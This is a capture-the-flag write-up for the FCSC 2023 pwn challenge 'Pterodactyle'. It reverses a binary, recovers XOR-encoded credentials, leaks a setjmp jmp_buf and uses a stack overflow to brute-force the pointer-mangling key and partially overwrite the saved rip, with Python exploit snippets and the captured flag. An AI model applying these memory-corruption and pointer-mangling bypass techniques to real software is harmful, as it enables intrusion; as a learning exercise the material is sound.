# FCSC2023 - Pwn Write-up : Pterodactyle


![](./data/fcsc.png)

## 👀 - Overview

```
Vous devez afficher le contenu du fichier flag.txt.

nc challenges.france-cybersecurity-challenge.fr 2102

SHA256(pterodactyle) = ``b3ea6eaa018090141a7ff60e03a4dc84dbed2fdf615c04ffb1e410ae1fc5f412``.
```

We are only given this [binary](./data/pterodactyle) file and no further instructions.

--

As always, we're starting by running the binary file praying it's not a malware !

```
$ ./pterodactyle
	1: Log in
	0: Exit
	>> 1
	Login:
	>> aaa
	Password:
	>> aaa
	Wrong password!
	1: Log in
	0: Exit
	>> 0
```

Alright, seems to do some basic authentification stuff, playing a bit with the inputs, you'll quickly find that you can cause **SIGSEV and SIGBUS** by sending large inputs as the login or the password, so it seems to be a **stack based challenge**.

Confirming this idea is the fact that there is no **canary protection** on the file:
```
$ checksec ./pterodactyle
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Before firing up ghidra and starting reversing, I like to check the symbols present in the binary:
```
$ nm ./pterodactyle
<snip>
0000000000004000 W data_start
00000000000012b8 T decrypt
<snip>
00000000000012fe T main
                 U memcmp@GLIBC_2.2.5
00000000000011f5 T menu
                 U open@GLIBC_2.2.5
0000000000002020 R PASSWORD
<snip>
0000000000004010 B stdout@GLIBC_2.2.5
0000000000004010 D __TMC_END__
0000000000002010 R USERNAME
                 U write@GLIBC_2.2.5
```
No obvious symbols like `flag` or `win`, but we can see the global variables `PASSWORD`, `USERNAME` and the function `decrypt` that seems pretty interesting 


## 🔍 - Analysis


Now let's understand what the binary does (simplified);
```c
int main() {
  connected = 0;
  env_value = _setjmp(&jmp_buf);
  switch(env_value) {
  case 0:
    longjmp(&jmp_buf,1);

  case 1:
    choice = menu(connected);
    if (choice == -1) {
      exit(1);
    }
    longjmp(&jmp_buf,choice + 1);

  case 2:
    puts("Login:");
    printf(">> ");
    fflush(stdout);
    size = read(0,login,128);
    decrypt(login, (size & 0xffffffff), (size & 0xffffffff), in_RCX, in_R8);
    puts("Password:");
    printf(">> ");
    fflush(stdout);
    size = read(0,password,128);
    decrypt(password, (size & 0xffffffff), (size & 0xffffffff), in_RCX, in_R8);
    env_value = memcmp(login,&USERNAME,5);
    if ((env_value == 0) && (env_value = memcmp(password,PASSWORD,0x10), env_value == 0)) {
      connected = 1;
    }
    else {
      puts("Wrong password!");
    }
    longjmp(&jmp_buf,1);

  case 3:
    if (connected == 0) {
      puts("Do not try to be smart!");
      longjmp(&jmp_buf,1);
    }
    puts("Here, get a cookie! Yum Yum! :-)");
    write(1,&jmp_buf,0x40);
    longjmp(&jmp_buf,1);

  case 4:
    if (connected == 0) {
      puts("Do not try to be smart!");
      longjmp(&jmp_buf,1);
    }
    puts("Bye bye o/");
    connected = 0;
    longjmp(&jmp_buf,1);

  default:
    exit(0);

  case 0x2a:
    break;
  }
  flag_file = open("flag.txt",0);
  size = read(flag_file,login,0x80);
  write(1,login, size);
  env_value = close(flag_file);
  longjmp(&jmp_buf,1);
}
```

Uhh, a switch case with no breaks ? _setjumpbuf ? longjmp ? jump_buf ???
![](./data/meme_pterodactyl.png)

So, after searching a lot about those, I finally understood that long jumps are used to **manipulate control flow** and retrieving the **saved state** of the program when the jump is initialized (_setjmp).


When `_setjmp` is called, the program will saved it's state (registers, stack etc...) in a struct called `jmp_buf` (we'll come back on that later), **return 0** and continue the normal execution flow until a `longjmp`, that takes **two parameters**, the said `jmp_buf` and a **return value** that the `_setjmp` will return.

So the first time `_setjmp` is called, when we start the binary, `env_value` is **0**, meaning that the **switch case** will go in the first case, which only does a `longjmp(&jmp_buf, 1)`. But this time, `env_value = _setjmp(&jmp_buf);` will not return 0 **but 1** since we called `longjmp` with 1, so the execution flow will go in the `case 1:` this time !

Alright, we understood what those weird functions does, now let's find the juicy stuff 🚀

--

The **case 2** jumps to the eyes, when reading `login` and `password` from `STDIN`, it reads **124 bytes** when the buffers of `login` and `password` are **only 32 bytes long** ! There is our vulnerable code, we can **overflow the buffer** and **overwrite the saved rip** to control execution flow !

But, finding the vulnerablity does not mean we finished the challenge, we now need a way to exploit it and to **bypass PIE** in order to return to where the flag is printed (after the switch case).

There is also another important part in this section, when the program reads `login` and `password` from the STDIN, it calls **decrypt** and then compares them to `LOGIN` and `PASSWORD` (global variables that we previously saw with the `nm` program). Checking the content of the variables makes me think that they are encrypted, so I directly go to the `decrypt` function (simplified):

```c
int decrypt(EVP_PKEY_CTX *ctx,uchar *out,size_t *outlen,uchar *in,size_t inlen)

{
  int i;
  
  for (i = 0; i < out; i = i + 1) {
    ctx[i] = (ctx[i] ^ 0x77);
  }
  return i;
}
```

... I was afraid when looking at all those weird parameters in the call, but it seems that it only does a basic xor operation on our input !

With that, we can easily extract the original values of PASSWORD and USERNAME, since: 
```
A ^ X = B
A ^ B = X
```

Here's my little python script to retrieve the origal values of USERNAME and PASSWORD:
```py
password_enc = b'\x3a\x0e\x24\x12\x34\x05\x44\x23\x27\x43\x53\x53\x20\x47\x05\x13'
username_enc = b'\x16\x13\x1a\x1e\x19'
key = 0x77

username = ""
for el in username_enc:
  username += chr(el ^ key)

password = ""
for el in password_enc:
  password += chr(el ^ key)


print(f"{username} : {password}")
```

And that gives us: `admin : MySeCr3TP4$$W0rd` !

-- 

Obviously, that's not enough to have the flag, but, we unlock a new choice:
```
Login:
>> admin
Password:
>> MySeCr3TP4$$W0rd
1: Log in
2: Get cookie
3: Logout
0: Exit
>> 2
Here, get a cookie! Yum Yum! :-)
�4��@�*0L�4��B���@^-0L�@�1
�
```

This cookie looks like a nice leak :-)

Looking at the code, we see that it indeed leak something, and it's the `jmp_buf` structure !

`write(1,&jmp_buf,0x40);`

Analysing what happens when we call `longjmp` with gdb, the `jmp_buf` looked like this:

```c
struct jmp_buf
{
  int stack_leak1;
  int saved_rbp_enc;
  int null1;
  int stack_leak2;
  int null2;
  int stack_leak3;
  int saved_rsp_enc;
  int saved_rip_enc;
};
```

# 🧙🏼‍♂️ - Exploiting

Doing a bit of local python scripting, I was able to extract all of those information thanks to the cookie leak.

```
Printing leaks...
leak1  - 0x00007fff7a4adce8
rbp    - 0x97e09f78bd948eb3
null1  - 0x0000000000000000
leak2  - 0x00007fff7a4adcf8
null2  - 0x0000000000000000
leak3  - 0x00007f735cd0c000
rsp    - 0x97e09f78bf548eb3
rip    - 0xc2dee6868c0a8eb3
```
> Some of you already saw my error...

First, we have stack addresses, so ASLR is bypassed, but this time we don't really care about ASLR, since we simply want to go where the flag is printed, so we need to bypass PIE.

The problem is that `rip` is encoded, and we need to know it's value to bypass PIE. Reversing a bit what the `longjmp` does with this encrypted value, I quickly saw that it does a `ror 11` on it then a `xor` operation... With a key that changes each time we start the binary 🥲

BUT it's not the end ! We have a **leak of the stack**, we have an **encrypted address on the stack** (`rbp`), the `rip` xored with the **same key** and we know that the **3 lowest bytes** of the final value of `rip` MUST be `0x31f` since PIE does not randomize those bytes... We can brute force the xor key ! 

Here's my python code:
```py
# Rotate right: 0b1001 --> 0b1100
ror = lambda val, r_bits, max_bits: \
  ((val & (2**max_bits-1)) >> r_bits%max_bits) | \
  (val << (max_bits-(r_bits%max_bits)) & (2**max_bits-1))


def calculate_xor_key(known, offset, enc):
  # enc ^ key = known + offset
  # (known+offset) ^ enc = key
  enc_phase1 = ror(enc, 17, 64)
  return (known + offset) ^ enc_phase1

def calculate_setjmp_addr(value, xor_key):
  return ror(value, 17, 64) ^ xor_key


leaks = leak_cookie()
print(f"Known leak : {hex(leaks['leak1'])}")
print(f"enc   rip  : {hex(leaks['rip'])}")

# the xor key is always in the range [0x18, 0x308] and ends with 0x8
for count, i in enumerate(range(0x18, 0x308, 0x10)):
    xor_key = calculate_xor_key(leaks["leak1"], -i, leaks["rbp"])
    print(f"test n°{count+1:02} : stack offset = -0x{i:02x}")
    if (calculate_setjmp_addr(leaks['rip'], xor_key) & 0xfff == 0x31f):
        print(f"FOUND !! <offset={i}> <xor_key={hex(xor_key)}>")
        break
    else:
        print("xor key not found :-(")

rip_leak  = calculate_setjmp_addr(leaks['rip'], xor_key)
rbp_leak  = calculate_setjmp_addr(leaks['rbp'], xor_key)
rsp_leak  = calculate_setjmp_addr(leaks['rsp'], xor_key)
base_addr = rip_leak - JMPBUF_RIP_OFFSET
win_addr  = base_addr + WIN_OFFSET

print(f"RIP  leak : {hex(rip_leak)}")
print(f"RBP  leak : {hex(rbp_leak)}")
print(f"RSP  leak : {hex(rsp_leak)}")
print(f"Base addr : {hex(base_addr)}")
print(f"Win  addr : {hex(win_addr)}")
```

Which gives us:
```
Known leak : 0x7ffcd52cfab8
enc   rip  : 0x7f7c30562d21198e
test n°01 : stack offset = -0x18
<snip>
test n°17 : stack offset = -0x118
FOUND !! <offset=280> <xor_key=0x8cc76a7169a5058f>
RIP  leak : 0x55cf718e131f
RBP  leak : 0x7ffcd52cf9a0
RSP  leak : 0x7ffcd52cf880
Base addr : 0x55cf718e0000
Win  addr : 0x55cf718e1595
```

PIE bypassed 😎

Just to be happy, I decided to test it remotely at this point
```
leak1  - 0x0000000000000000
rbp    - 0xc73979fe79b6b2e1
null1  - 0x0000065a6d28a110
leak2  - 0x0000000000000000
null2  - 0x0000000000000000
leak3  - 0x0000000000000000
rsp    - 0xc73979fe7b76b2e1
rip    - 0x23efeaa70d28b2e1
Known leak : 0x0
enc   rip  : 0x23efeaa70d28b2e1
test n°01 : stack offset = -0x18
<snip>
xor key not found :-(
```

... What ?

The cookie leak does not gives us stack leaks ? ... 😳

Alright so my big error here was to **assume** that the `longjmp` part will behave the same way **locally and remotly**, since it was new to me, I did not assumed that there could be any difference, which is stupid, stuff changes with **libc versions** and my libc is probably not the one used in challenges. The challenge's `jmp_buf` does not have stack leaks, it **seems** to only have rbp, rsp and rip encrypted, and something else I still don't really know what it is.

After a good night of sleep, I came back with new ideas, we don't have any stack leak so we can not fully leak the xor key, but we still know what the **3 lowest bytes** of rip is, and we just need to **overwrite those 3 bytes** since the code where the flag is printed is **in the binary**.

So yeah, we can't bypass PIE, but we can xor the 3 lowest bytes of our win address (0x595) and replace the result with the 3 lowest bytes `rip_enc` in the `jmp_buf` struct, so when `_setjmp` will be called, it will go to our win address instead of continuing normal execution flow. And since we have a buffer overflow on `password`, and that `jmp_buf` is located under `password` in the stack, we can overwrite it ! So we do so, replacing only the last 3 bytes of `rip_enc`.

```

win_phase1_lsb = 0x595 ^ xor_lsb

# replacing last 3 bytes
rip_phase1 = ror(leaks["rip"], 17, 64)
rip_to_str = hex(rip_phase1)[:-3]
rip_phase1_patched = int(rip_to_str + hex(win_phase1_lsb)[2:], 16)
```

The last thing I had to do is to xor my entire payload with 0x77 since my payload will go through the `decrypt` function that xor it with 0x77, once it's done, I just had to start the script and pray

And....

```
$ python3 exploit.py
leak1  - 0x0000000000000000
rbp    - 0x86702625b2e54d13
null1  - 0x0000564d5ae60110
leak2  - 0x0000000000000000
null2  - 0x0000000000000000
leak3  - 0x0000000000000000
rsp    - 0x86702625b0a54d13
rip    - 0xd51563324a3b4d13
Brute forcing 3 LSB xor key

Found match for xor key = 0x602
win_enc value : 0xa689ea8ab1992397
Sending payload...
---------------------------
[*] Switching to interactive mode
Wrong password!
FCSC{17dc6f007f4149469fe3d361d5b1c7f9694f3ec363b26e051974540aa6eaf666}
```

We got the flag !! 🥳


# ✅ - Conclusion

Really interesting challenge, made me discover long jumps and do some cool tricks with the stack.

Despite my error that cost me a lot of time, I was close enough and was able to solve it, even if I was kinda desesperate when I understood that I did not had stack leaks remotely. It was still interesting to brute force the xor key with the offset of the leak and rbp so it's fine and I ended up flagging with the correct way so it's fine :-)